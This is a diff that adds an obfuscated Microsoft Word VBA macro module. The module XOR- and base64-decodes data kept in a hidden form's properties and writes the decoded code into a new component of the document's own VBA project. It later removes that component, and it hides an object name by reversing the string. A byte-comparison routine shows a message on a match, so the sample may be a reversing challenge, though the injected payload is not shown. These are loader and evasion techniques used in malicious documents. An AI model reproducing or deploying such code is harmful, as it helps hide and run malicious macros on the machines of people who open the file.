@@ -1,0 +1,101 @@
+Attribute VB_Name = "Z1yiWeP"
+Function d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(JwFeyAb5x, AgkWcn As Byte) As Variant
+    Dim bzTec() As Byte
+    ReDim bzTec(UBound(JwFeyAb5x))
+    For cz9vzhBR = 0 To UBound(JwFeyAb5x)
+        bzTec(cz9vzhBR) = JwFeyAb5x(cz9vzhBR) Xor AgkWcn
+    Next
+    d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql = bzTec
+End Function
+
+Private Sub ir0a6FeeF0LUThieRM7v6qxfWFJD1dT6BzDH()
+    Dim opy7ej As VBIDE.VBProject
+    Dim PiO3rcWe As VBIDE.VBComponent
+    Set opy7ej = ActiveDocument.VBProject
+    Set PiO3rcWe = opy7ej.VBComponents("IadnoxRap3")
+    opy7ej.VBComponents.Remove PiO3rcWe
+End Sub
+
+Function YhGEH9M4EBM4CJgXjOsrcHsa(u48G As Byte, G6NK) As Variant
+    YhGEH9M4EBM4CJgXjOsrcHsa = d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(G6NK, u48G)
+End Function
+
+Function lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo(sHZF70G) As String
+    TPjEpV = ""
+    For cz9vzhBR = 1 To UBound(sHZF70G)
+        TPjEpV = TPjEpV & StrConv(sHZF70G(cz9vzhBR), 64)
+    Next
+    lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo = StrConv(sHZF70G, 64)
+End Function
+
+Function oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(Rfn10hWpA, XPbV8Rj5Q) As Boolean
+    If UBound(Rfn10hWpA) = UBound(XPbV8Rj5Q) Then
+        oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = True
+        For z5PQAfu9 = 0 To UBound(Rfn10hWpA)
+            If (Rfn10hWpA(z5PQAfu9) <> XPbV8Rj5Q(z5PQAfu9)) Then
+                oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = False
+                z5PQAfu9 = UBound(Rfn10hWpA)
+            End If
+        Next z5PQAfu9
+    Else
+        oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = False
+    End If
+End Function
+
+Private Sub DGOoR0P7MooO533jiHhTv1sgIoOtbjkzd57H()
+    Dim yQnfle As VBIDE.VBProject
+    Dim TQhuHj As VBIDE.VBComponent
+    Set yQnfle = ActiveDocument.VBProject
+    Set TQhuHj = yQnfle.VBComponents.Add(1)
+    TQhuHj.CodeModule.InsertLines 1, lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo( _
+    d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(U8pblvDZuAh8GY.TextBox1 _
+    ), U8pblvDZuAh8GY.TextBox1.Left))
+    TQhuHj.Name = "IadnoxRap3"
+End Sub
+
+Function bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk(ToEZKjU, qSFa4f) As Variant
+    Dim Qteou7() As Byte
+    ReDim Qteou7(UBound(ToEZKjU))
+    For Uvhtuj = 0 To UBound(ToEZKjU)
+        Qteou7(Uvhtuj) = ToEZKjU(Uvhtuj) Xor qSFa4f(Uvhtuj)
+    Next
+    bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk = Qteou7
+End Function
+
+Function Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB(nuQXoad42c5)
+    Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB = False
+    Dim yTV2li() As Byte
+    yTV2li = Z1yiWeP.d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(nuQXoad42c5, U8pblvDZuAh8GY.HelpContextId)
+    Dim VGmMTyf() As Byte
+    VGmMTyf = Z1yiWeP.YhGEH9M4EBM4CJgXjOsrcHsa(Int(U8pblvDZuAh8GY.ScrollHeight), yTV2li)
+    If oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(VGmMTyf, t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(U8pblvDZuAh8GY.Label1.Caption)) Then
+        Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB = True
+    End If
+End Function
+
+Function t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(qqZUlc9)
+    aexjT = Trim(qqZUlc9)
+    Set vW3zM = CreateObject(StrReverse("tnemucoDMOD.2LMXSM"))
+    Set ugBi6C = vW3zM.createElement("b64")
+    ugBi6C.dataType = "bin.base" + CStr(vbUnicode)
+    ugBi6C.Text = aexjT
+    t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG = ugBi6C.nodeTypedValue
+    Set ugBi6C = Nothing
+    Set vW3zM = Nothing
+End Function
+
+Sub XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM(EZ9KcDzT, pNRoZP57xLx)
+    Dim ang8rjzwn() As Byte
+    ang8rjzwn = Z1yiWeP.d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(EZ9KcDzT, U8pblvDZuAh8GY.ScrollWidth)
+    Dim upnFZMT9P() As Byte
+    upnFZMT9P = Z1yiWeP.YhGEH9M4EBM4CJgXjOsrcHsa(U8pblvDZuAh8GY.Zoom, ang8rjzwn)
+    Dim s06() As Byte
+    s06 = Z1yiWeP.bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk(upnFZMT9P, t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(pNRoZP57xLx))
+    If Z1yiWeP.oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(s06, Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(StrReverse(U8pblvDZuAh8GY.Tag))) Then
+        MsgBox Z1yiWeP.lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo(EZ9KcDzT)
+    End If
+End Sub
+
+Sub pZVZ0Q8ygfA6jcSJRLEKZSyv40IDQzErCpah(tnfbhVCs, AjkbXE)
+    XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM tnfbhVCs, AjkbXE
+End Sub
